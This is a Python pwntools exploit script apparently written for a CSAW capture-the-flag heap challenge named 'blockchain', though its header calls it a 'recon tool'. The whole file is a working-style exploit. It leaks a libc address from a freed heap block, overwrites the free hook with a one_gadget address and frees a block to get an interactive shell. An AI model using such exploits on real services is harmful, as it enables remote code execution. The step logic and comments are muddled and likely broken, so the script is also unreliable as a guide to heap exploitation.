# A blockchain recon tool using pwntools

from pwn import context, ELF, remote, process, args, log, u64, p64

binary = context.binary = ELF('./blockchain')

if args.REMOTE:
    p = remote('pwn.chal.csaw.io', 1005)
else:
    p = process(binary.path)


def create_block(data):
    p.sendlineafter('choice: ', '1')
    p.sendafter('block: ', data)


def print_block(index):
    p.sendlineafter('choice: ', '2')
    p.sendlineafter('index: ', str(index))


def delete_block(index):
    p.sendlineafter('choice: ', '3')
    p.sendlineafter('index: ', str(index))


def edit_block(index, data):
    p.sendlineafter('choice: ', '4')
    p.sendlineafter('index: ', str(index))
    p.sendafter('block: ', data)


def main():
    # create a bunch of blocks
    for i in range(10):
        create_block('A'*8)

    # delete the middle block
    delete_block(5)

    # create a new block to get a pointer to the middle block
    create_block('B'*8)

    # edit the block to get a pointer to the middle block
    edit_block(5, 'C'*8)

    # print the middle block to leak libc
    print_block(5)
    p.recvuntil('C'*8)
    libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebca0
    log.info('libc base: ' + hex(libc_base))

    # free hook = one gadget
    free_hook = libc_base + 0x3ed8e8
    one_gadget = libc_base + 0x4f322

    # edit the middle block to get a pointer to the free hook
    edit_block(5, p64(free_hook))

    # create a new block to get a pointer to the free hook
    create_block('D'*8)

    # edit the block to get a pointer to the free hook
    edit_block(5, p64(one_gadget))

    # free the free hook to get shell
    delete_block(5)

    p.interactive()


if __name__ == "__main__":
    main()
